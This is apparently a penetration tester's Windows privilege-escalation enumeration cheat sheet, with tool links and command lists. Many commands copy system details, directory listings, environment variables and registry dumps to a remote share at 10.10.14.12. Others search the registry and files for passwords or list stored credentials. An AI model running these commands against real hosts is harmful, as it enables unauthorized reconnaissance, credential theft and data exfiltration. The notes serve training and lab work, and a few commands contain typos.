---
layout: default
title: Windows
parent: ENUMERATION
has_children: false
has_toc: false
---

{% include toc.html %}

## Resources
[Heath Adams' PrivEsc Udemy course repo](https://github.com/Gr1mmie/Windows-Privilege-Escalation-Resources.git)

[Swisskyrepo PayloadsAllTheThings Windows Privilege Escalation repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md)

[Sushant747 Total OSCP Guide Windows Privilege Escalation](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)

[hacktricks.xyz](
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)

[SecWiki Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

[Windows Privilege Escalation (General)](https://xapax.gitbooks.io/security/privilege_escalation_windows.html)

[RopNop](https://blog.ropnop.com/practical-usage-of-ntlm-hashes/)

## Automation
### Windows Exploit Suggester - Next Generation (WES-NG)
```
sudo git clone https://github.com/bitsadmin/wesng.git /opt/wesng
```

First, update the database using `python3 /opt/wesng/wes.py --update`. Grab the output of `systeminfo.exe` into a file (in this case `systeminfo`) and then feed into `wes.py`:

```
python3 /opt/wesng/wes.py systeminfo > exploit-list
python3 /opt/wesng/wes.py systeminfo -i "Elevation of Privileges" systeminfo > exploit-list
python3 /opt/wesng/wes.py systeminfo -i "Remote Code Execution" -s "Critical" systeminfo > exploit-list
```

### Windows Privilege Escalation Check
```
sudo git clone https://github.com/pentestmonkey/windows-privesc-check.git /opt/windows-privesc-check
```

### WinPEAS
WinPEAS has a `.bat` along with a pre-built `.exe`. The code is `C#` so an alternative is to recompile and test using `VirusTotal`. 

```
sudo git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git /opt/privilege-escalation-awesome-scripts-suite
```

### Others
Credit to Heath Adams' Udemy course `Windows Privilege Escalation for Beginners`:
* seatbelt.exe
* watson.exe
* sharpup.exe
* sherlock.ps1
* powerup.ps1 (PowerShellMafia/PowerSploit)
* jaws-enum.ps1

## Terminal
*Powershell may well be logged, as may calls to WMIC.*

### System details
```
hostname                                                // Print hostname
systeminfo                                              // System details, architecture, patch level
wmic qfe list                                           // Windows Update details
Get-Hotfix                                              // Windows update details from Powershell
net accounts                                            // General account details
wmic logicaldisks get caption,description,providername  // Disks attached to the system
net localgroup <group name>                             // Shows group members of the specified group
net localgrooup Administrators                          // Shows what other groups have admin rights
```

### User details
```
whoami /all
wmic useraccount get name
net user                                                // Show user accounts
net user Administrator                                  // Show details for Administrator
net user <user>                                         // Show details for <user>
```

### Recursive directory listing
Recursive (`/s`) listing from \, show all files including hidden (`/a`), include owner (`/q`) and alternate datastreams (`/r`), save to temp, copy to share and delete temp file.
```
dir C:\ /s /a /q /r
dir C:\ /s /a /q /r > %temp%\1185 && copy %temp%\1185 \\10.10.14.12\share\dir-full & del %temp%\1185 
```

### Recursive directory listing of Users
```
dir C:\Users\ /s /a /q /r > %temp%\1185 && copy %temp%\1185 \\10.10.14.12\share\dir-users & del %temp%\1185 
```

### Recursive search for files of type
From current directory:
```
dir *.ini /s /a /b
dir *.bat /s /a /b
dir *.cmd /s /a /b
dir *.cmd /s /a /b
```

From root:
```
dir C:\ /s /a /b | findstr /i ".bkf" > %temp%\1187 && copy %temp%\1187 \\10.10.14.12\share\dir-bkf & del %temp%\1187       // Windows Backup files
dir C:\ /s /a /b | findstr /i ".bak" > %temp%\1188 && copy %temp%\1188 \\10.10.14.12\share\dir-bak & del %temp%\1188
dir C:\ /s /a /b | findstr /i ".zip" > %temp%\1189 && copy %temp%\1189 \\10.10.14.12\share\dir-zip & del %temp%\1189
dir C:\ /s /a /b | findstr /i ".7z" > %temp%\1190 && copy %temp%\1190 \\10.10.14.12\share\dir-7z & del %temp%\1190         // 7zip
dir C:\ /s /a /b | findstr /i ".ini" > %temp%\1191 && copy %temp%\1191 \\10.10.14.12\share\dir-ini & del %temp%\1191
dir C:\ /s /a /b | findstr /i ".bat" > %temp%\1192 && copy %temp%\1192 \\10.10.14.12\share\dir-bat & del %temp%\1192
dir C:\ /s /a /b | findstr /i ".cmd" > %temp%\1193 && copy %temp%\1193 \\10.10.14.12\share\dir-cmd & del %temp%\1193
dir C:\ /s /a /b | findstr /i ".conf" > %temp%\1194 && copy %temp%\1194 \\10.10.14.12\share\dir-conf & del %temp%\1194
```

### Recursive modified objects listing
Search for objects modified since the specified data (`+MM/DD/YYYY`) and save to a temp file in a parsable format, copy to share and delete temp file.
```
forfiles /p C:\ /s /d +MM/DD/YYYY /c "cmd.exe /c echo [path=@path][last-modified=@fdate @ftime][is-dir=@isdir]" 2>nul > %temp%\1186 && copy %temp%\1186 \\10.10.14.12\share\modified & del %temp%\1186 
```

### Environment variables
```
set >> \\10.10.14.12\share\env

reg query "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment" > \\10.10.14.12\share\HKLM-env

reg query "HKEY_CURRENT_USER\Environment" > \\10.10.14.12\share\HKCU-env
```

### Running processes
```
tasklist /v /fo list > \\10.10.14.12\share\tasklist
```

### Services
```
sc query > \\10.10.14.12\share\services
wmic service get name,startname > \\10.10.14.12\share\service-owners

reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```

### Unquoted service paths
This will show unquoted paths including those that do not contain spaces. If the output contains paths with spaces, use `icacls` along the path to see if your user can write to any of the folders.
```
wmic service get name,pathname,startname,displayname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """ > \\10.10.14.12\share\unquoted-service-paths
```

### Installed .Net versions
Both calls are required: WMIC call is used for later frameworks.
```
dir /b /ad /o-n %systemroom%\Microsoft.NET\Framework\v?.* > \\10.10.14.12\share\dot-net-versions
wmic product get description | findstr /C:".Net Framework" \\10.10.14.12\share\dot-net-versions-later
```

### Installed software
The output may be in relation to the groups the account running the command belongs to. This should really be run by an account with Administrator privileges.
```
wmic product get name,description,version,vendor,installlocation > \\10.10.14.12\share\installed-software-versions 
```

### Directory permissions
Looking for "BUILTIN\Users:(W)" so we can add to a directory as a non-privileged user.
```
icacls "C:\path\to\folder\" > \\10.10.14.12\share\folder-perms
icacls %temp% > \\10.10.14.12\share\temp-folder
```

### Looking for interesting binaries
```
where python.exe python3.exe {...} > \\10.10.14.12\share\interesting-binaries
```

### Installed AV/Firewall
Should be able to run unprivileged.
```
netsh firewall show state                           // netsh firewall is deprected.
netsh advfirewall show currentprofile               // Replacement version
```


Needs Administrator to run.
``` 
wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayname > \\10.10.14.12\share\av-product
```

```
sc query windefend                                  // Query if Windows Defener is running
sc queryex type=service                             // List all running services containing names of other AV vendors

netsh advfirewall firewall dump                     // Dump firewall details
netsh firewall show state                           // Show firewall status
```

### Scheduled tasks
Verbose, full listing, including task owner.
```
schtasks /query /v /fo list > \\10.10.14.12\share\scheduled-tasks
```

### Networking
```
netstat -ano
netstat -anoq           // If using unprivileged account
netstat -anoqb          // If using privileged account
ipconfig /all
arp -a                  // ARP table
netstat -r >            // Routes
route print
```

### Powershell details
*Credit to WinPEAS.bat*
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Miscrosoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion >> \\10.10.14.12\share\powershell

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Miscrosoft\PowerShell\3\PowerShellEngine" /v PowerShellVersion >> \\10.10.14.12\share\powershell

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" >> \\10.10.14.12\share\powershell

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" >> \\10.10.14.12\share\powershell

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" >> \\10.10.14.12\share\powershell

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Searching in files
```
findstr /si password *.txt *.init *.config      // Recursive search of file types for word "password" from current folder
```

### Stored credentials
If credentials have been stored, `runas` has `/user` and `/savecred` flags that can use stored credentials. To check for stored credentials:
```
cmdkey /list
```

### WebDav
```
davtest -url http://10.x.x.x/
```